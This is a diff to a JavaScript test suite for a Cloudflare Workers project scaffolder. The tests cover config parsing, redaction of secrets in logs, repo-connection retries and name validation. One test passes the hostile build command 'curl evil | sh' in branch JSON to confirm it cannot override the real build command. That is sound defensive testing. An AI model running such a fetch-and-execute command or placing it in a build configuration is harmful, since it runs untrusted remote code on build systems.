@@ -3,7 +3,7 @@ import assert from 'node:assert/strict'
 import { mkdtempSync, readFileSync, existsSync, rmSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
-import { projectFromBranch, validName, wranglerConfig, packageJson, buildCommands, writeScaffold } from './new-project.mjs'
+import { projectFromBranch, validName, wranglerConfig, packageJson, buildCommands, writeScaffold, describe, redact, hookIdFrom, connectRepo, ensureBuilds, buildState } from './new-project.mjs'
 
 test('names are workers.dev safe', () => {
   assert.ok(validName('duo-test'))
@@ -44,7 +44,101 @@ test('the scaffold is written with the name filled in and runs its own verify', 
 })
 
 test('a pushed new/<name> branch names the project, its json the options', () => {
-  assert.deepEqual(projectFromBranch('new/shop', () => null), { name: 'shop', d1: true, org: 'yverse-studio' })
-  assert.deepEqual(projectFromBranch('new/shop', () => ({ d1: false, org: 'other' })), { name: 'shop', d1: false, org: 'other' })
+  const pick = (p) => ({ name: p.name, d1: p.d1, org: p.org, repo: p.repo })
+  assert.deepEqual(pick(projectFromBranch('new/shop', () => null)), { name: 'shop', d1: true, org: 'yverse-studio', repo: 'shop' })
+  const branchOnly = (json) => (file) => (file.startsWith('incoming/') ? json : null)
+  assert.deepEqual(pick(projectFromBranch('new/shop', branchOnly({ d1: false, org: 'other' }))), { name: 'shop', d1: false, org: 'other', repo: 'shop' })
+  const sneaky = projectFromBranch('new/shop', branchOnly({ name: 'mypage', repo: 'claude-setup', build: 'curl evil | sh' }))
+  assert.deepEqual([sneaky.name, sneaky.repo, sneaky.existing, sneaky.commands.production.build_command], ['shop', 'shop', false, 'npm run check && npm run build'], 'a pushed branch cannot override name, repo or commands')
+  const onMain = projectFromBranch('new/mypage', (file) => (file === 'projects/mypage.json' ? { d1: false, repo: 'MyPage' } : { repo: 'other' }))
+  assert.deepEqual([onMain.repo, onMain.existing], ['MyPage', true], 'the registry on main wins over the branch')
   assert.equal(projectFromBranch('main', () => null), null)
+})
+
+test('API answers are logged without secrets or hook ids, and hook ids are read from any known shape', () => {
+  const body = '{"result":{"deploy_hook_uuid":"abc-123","build_token_secret":"s3cret","ok":"x"},"success":true}'
+  const line = describe({ status: 200, json: JSON.parse(body), text: body })
+  assert.match(line, /^200 keys=\[result,success\] result=\[deploy_hook_uuid,build_token_secret,ok\]/)
+  assert.doesNotMatch(line, /abc-123|s3cret/)
+  assert.doesNotMatch(redact('x'.repeat(40)), /x{40}/)
+  assert.doesNotMatch(redact('{"id":"h1","uuid":"h2","x":"0f8fad5b-d9cb-469f-a165-70867728950e","y":"6729db15516a425d985bd27ff6dc179e"}'), /h1|h2|0f8fad5b|6729db15/)
+  assert.equal(hookIdFrom({ deploy_hook_uuid: 'a' }), 'a')
+  assert.equal(hookIdFrom({ hook_id: 'b' }), 'b')
+  assert.equal(hookIdFrom({ deploy_hook: { uuid: 'c' } }), 'c')
+  assert.equal(hookIdFrom(null), null)
+})
+
+function fakeCf(answer) {
+  const calls = []
+  const cf = async (path, init) => { calls.push({ path, init }); return answer(path, init, calls.length) }
+  return { cf, calls }
+}
+const refused = { ok: false, status: 404, json: { success: false, errors: [{ code: 8000008, message: 'This project is disconnected from your Git account' }], result: null }, text: '' }
+const saved = { ok: true, status: 200, json: { success: true, errors: [], result: { repo_connection_uuid: 'c1' } }, text: '' }
+const repo = { id: 123, owner: { id: 456 } }
+
+test('the repo connection is saved first, with the identifiers Cloudflare accepts, and the build configuration uses them', async () => {
+  const { cf, calls } = fakeCf((path, init) => (init.body.repo_id === 'deploy-test' ? saved : refused))
+  const git = await connectRepo(cf, { repo, org: 'yverse-studio', name: 'deploy-test', tries: 1 })
+  assert.deepEqual(calls.map((c) => c.path), ['/builds/repos/connections', '/builds/repos/connections'])
+  assert.equal(calls[0].init.body.provider_account_id, '456')
+  assert.equal(calls[0].init.body.repo_id, '123')
+  assert.deepEqual(git, { provider_type: 'github', provider_account_name: 'yverse-studio', repo_name: 'deploy-test', provider_account_id: 'yverse-studio', repo_id: 'deploy-test' })
+
+  const builds = fakeCf((path) => (path === '/builds/workers' ? saved : refused))
+  await ensureBuilds(builds.cf, { tag: 't', git, org: 'yverse-studio', name: 'deploy-test', branch: 'main', d1: false, buildTokenUuid: 'b' })
+  assert.deepEqual(builds.calls[1].init.body.git_repository, { ...git, branch: 'main' })
+})
+
+test('a repo Cloudflare does not know is retried, then the run stops with the answers and the fix', async () => {
+  const { cf, calls } = fakeCf(() => refused)
+  await assert.rejects(
+    connectRepo(cf, { repo, org: 'yverse-studio', name: 'deploy-test', tries: 3, waitMs: 0 }),
+    (err) => /after 3 tries: numeric ids: 8000008 .*; names: 8000008 .*github\.com\/organizations\/yverse-studio\/settings\/installations/.test(err.message),
+  )
+  assert.equal(calls.length, 6)
+  const builds = fakeCf(() => refused)
+  await assert.rejects(ensureBuilds(builds.cf, { tag: 't', git: {}, org: 'o', name: 'n', branch: 'main', d1: false, buildTokenUuid: 'b' }), /did not connect o\/n: 8000008/)
+})
+
+test('only "repo unknown" is retried; any other answer stops the run at once', async () => {
+  const forbidden = fakeCf(() => { throw new Error('Cloudflare PUT /builds/repos/connections: 403 {"errors":[{"code":10000}]}') })
+  await assert.rejects(connectRepo(forbidden.cf, { repo, org: 'o', name: 'n', tries: 3, waitMs: 0 }), /403/)
+  assert.equal(forbidden.calls.length, 1)
+  const otherNotFound = fakeCf(() => ({ ok: false, status: 404, json: { success: false, errors: [{ code: 12040, message: 'no such thing' }], result: null }, text: '' }))
+  await assert.rejects(connectRepo(otherNotFound.cf, { repo, org: 'o', name: 'n', tries: 3, waitMs: 0 }), /12040 no such thing/)
+  assert.equal(otherNotFound.calls.length, 1)
+})
+
+test('a build is judged by its outcome once it has stopped', () => {
+  assert.deepEqual(buildState({ status: 'running', build_outcome: null }), { status: 'running', running: true, outcome: null })
+  assert.deepEqual(buildState({ status: 'stopped', build_outcome: 'success' }), { status: 'stopped', running: false, outcome: 'success' })
+  assert.equal(buildState({ status: 'stopped', build_outcome: 'fail' }).outcome, 'fail')
+  assert.equal(buildState({ status: 'failure' }).outcome, 'failure')
+  assert.equal(buildState(null).running, true)
+})
+
+test('an existing repo keeps its own name, branch and commands', async () => {
+  const { projectConfig, validRepo } = await import('./new-project.mjs')
+  const fresh = projectConfig('app')
+  assert.deepEqual([fresh.repo, fresh.existing, fresh.d1, fresh.secret, fresh.org], ['app', false, true, true, 'yverse-studio'])
+  assert.equal(fresh.commands.production.deploy_command, 'npm run deploy')
+  const page = projectConfig('mypage', { d1: false, repo: 'MyPage', build: 'npm run check && npm run generate', secret: false })
+  assert.deepEqual([page.repo, page.existing, page.secret], ['MyPage', true, false])
+  assert.equal(page.commands.production.build_command, 'npm run check && npm run generate')
+  assert.equal(page.commands.production.deploy_command, 'npx wrangler deploy')
+  assert.equal(page.commands.previews.deploy_command, 'npx wrangler preview')
+  assert.ok(validRepo('MyPage') && !validRepo('../x') && !validRepo('a/b'))
+  const { validBranch } = await import('./new-project.mjs')
+  assert.ok(validBranch('origin') && validBranch('main') && !validBranch('-x') && !validBranch('a..b'))
+})
+
+test('every registered project is a valid config', async () => {
+  const { readdirSync, readFileSync: read } = await import('node:fs')
+  const { projectConfig, validName, validRepo } = await import('./new-project.mjs')
+  for (const file of readdirSync(new URL('../projects/', import.meta.url)).filter((f) => f.endsWith('.json'))) {
+    const cfg = projectConfig(file.slice(0, -5), JSON.parse(read(new URL(`../projects/${file}`, import.meta.url), 'utf8')))
+    assert.equal(`${cfg.name}.json`, file)
+    assert.ok(validName(cfg.name) && validRepo(cfg.repo), file)
+  }
 })
